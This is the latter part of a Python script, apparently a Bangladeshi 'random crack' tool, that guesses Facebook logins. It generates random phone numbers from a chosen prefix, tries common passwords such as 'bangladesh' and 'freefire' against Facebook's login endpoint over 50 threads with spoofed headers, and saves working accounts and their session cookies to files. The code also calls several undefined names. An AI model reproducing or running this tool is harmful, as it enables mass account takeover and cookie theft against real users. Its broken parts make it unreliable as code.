'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'     
        
        
        ]
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)
#-----[Logo]-----#

logo = (f"""
       \x1b[1;90m╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
       \x1b[1;90m┃  \033[1;95m   ╭━━━┳╮╱╭┳━━━┳╮╱╭┳━━━┳━━━┳━━┳━━━┳━━━╮\x1b[1;90m     ┃
       \x1b[1;90m┃  \033[1;91m   ┃╭━╮┃┃╱┃┃╭━╮┃┃╱┃┃╭━╮┃╭━╮┣┫┣┫╭━╮┃╭━╮┃\x1b[1;90m     ┃
       \x1b[1;90m┃  \033[1;97m   ┃╰━━┫╰━╯┃┃╱┃┃╰━╯┃┃╱┃┃╰━╯┃┃┃┃┃╱┃┃╰━╯┃\x1b[1;90m     ┃
       \x1b[1;90m┃  \033[1;96m   ╰━━╮┃╭━╮┃╰━╯┃╭━╮┃╰━╯┃╭╮╭╯┃┃┃╰━╯┃╭╮╭╯\x1b[1;90m     ┃
       \x1b[1;90m┃  \033[1;93m   ┃╰━╯┃┃╱┃┃╭━╮┃┃╱┃┃╭━╮┃┃┃╰┳┫┣┫╭━╮┃┃┃╰╮\x1b[1;90m     ┃
       \x1b[1;90m┃  \033[1;95m   ╰━━━┻╯╱╰┻╯╱╰┻╯╱╰┻╯╱╰┻╯╰━┻━━┻╯╱╰┻╯╰━╯\x1b[1;90m     ┃
       \x1b[1;90m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
   \033[1;92mM  \033[1;91mI  \033[1;93mX  \033[1;94mR  \033[1;95mA  \033[1;97mN  \033[1;97mD  \033[1;97mO  \033[1;97mM  \033[1;97m-  \033[1;92mT  \033[1;91mO  \033[1;93mO  \033[1;94mL  \033[1;95mS  \033[1;97m-  \033[1;92mF  \033[1;93mI  \033[1;94mR  \033[1;95mE
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
[\033[1;92m\033[1;31m•\033[1;92m]DEVOLPER   \033[1;91m:         \033[1;92m{YELLOW} SHAHARIAR
[\033[1;92m\033[1;31m•\033[1;92m]FACEBOOK   \033[1;91m:         \033[1;92m{RED} Shahariar Zaman
[\033[1;92m\033[1;31m•\033[1;92m]WHATSAPP   \033[1;91m:         \033[1;92m +8801867468585
[\033[1;92m\033[1;31m•\033[1;92m]GITHUB     \033[1;91m:         \033[1;92m{BLUE} shahariar001M
[\033[1;92m\033[1;31m•\033[1;92m]TOOLS      \033[1;91m:         \033[1;92m{H} RANDOM-MIX \033[1;94m[\033[1;95mV2.5\033[1;94m]
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••""")
#-----[App Checker]-----#
try:
   print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
   v = 5.2
   update = ('5.2')
   update = ('5.2')
   if str(v) in update:
       os.system('clear')
   else:pass
except:print('\n\033[1;31mNO INTERNET CONNECTION ⚠️ ... \033[0;97m')

def linex():
        print('\033[1;37m ──────────────────────────────────────────')
 
def clear():
    os.system('clear')
    print(logo)
    
#-----[Loop Menu]-----#  
loop = 0
oks = []
cps = []

#-----[Main-Menu]-----#
def mahdi_menu():
    os.system('clear');print(logo)
    print('\033[1;92m [A] RANDOM CRACK')
    print('\033[1;92m [#] EXIT TOOL')
    linex()
    mahdi=input(' \033[1;32m[?] SELECT MENU: ')
    if mahdi in['A']:MAHDI()
    elif mahdi in['#']:exit()
    else:exit()
    
def MAHDI():
    user=[]
    twf =[]
    #os.getuid
    #os.geteuid
    os.system("clear")
    print(logo)
    print('\033[1;32m [√] BD CODE : 017/019/016/018/013/015')
    linex()
    code =input('\033[1;32m [?] CHOOSE : ')
    os.system('clear')
    print(logo)
    print('\033[1;32m [√] EXAMPLE : 3000/5000/10000/50000')
    linex()
    limit = int(input('\033[1;32m [?] CHOOSE : '))
    linex()
    #xd_cp=input(f'\033[1;32m [?] You Want To Show Cp Account?[\033[1;32mY\033[1;34m/\033[1;31mN\033[1;32m]: ')
    #if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
    #else:cp_cpx.append('n')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as ahare:
        clear()
        tl = str(len(user))
        print('\033[1;32m [+] Choice Code: '+code)
        print('\033[1;92m [+] Crack Process Has Started')
        print('\033[1;92m [!] Data & WiFi Both Working. Data Best ✅')
        print('\033[1;92m [!] Use Flight Mode in Data For Speed Up')
        linex()
        for fuck in user:
            pwx = [fuck,'bangladesh',fuck[2:],code+fuck,'Bangladesh','freefire','FreeFire','FREE FIRE','FREEFIRE','Free Fire','I Love You','i love you',code+fuck[5:]]
            uid = code+fuck
            ahare.submit(mahdix,uid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('Ok Ids Saved in /ALIVE.txt')
    print('Cp Ids Saved in /EXPIRED.txt')
    linex()
    
def mahdix(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(mahdiusr)
            session = requests.Session()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}

            header_freefb = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'user-agent': pro,
    'authority': 'developer.facebook.com',
    'method': 'POST',
    'scheme': 'https',
    'Host': 'developer.facebook.com',
    'access-control-allow-origin': '*',
    'facebook-api-versiom': 'v17.0',
    'strict-transport-security': 'max-age=15552000',
    'pragma': 'no-cache',
    'cache-control': 'private, no-cache, no-store, must-revalidate',
    'x-fb-request-id': 'AIte0DcdoNou-PrLonFJoWm',
    'x-fb-trace-id': 'D1ArfmcS+Ue',
    'x-fb-rev': '1007754578',
    'x-fb-debug': 'HMSmCqhactzrCNNUNVDRwkz9OF5t3Y/gu9pIbVKSYgrrj5I/hvY6JX9MWgq3Z/hs9xyyu1WRy6EqZezaas070g==',
    'alt-svc': 'h3=":443"; ma=86400',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://m.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://developer.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[ALIVE✔️] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE🍪] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/ALIVE.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[EXPIRED]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/EXPIRED.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s\033[0;97m[\033[0;96m{mahdix.my_color}RUNNING\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mAlive\033[0;97m/\033[0;91mExpired\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

#-----[Run Menu]-----#
mahdi_menu()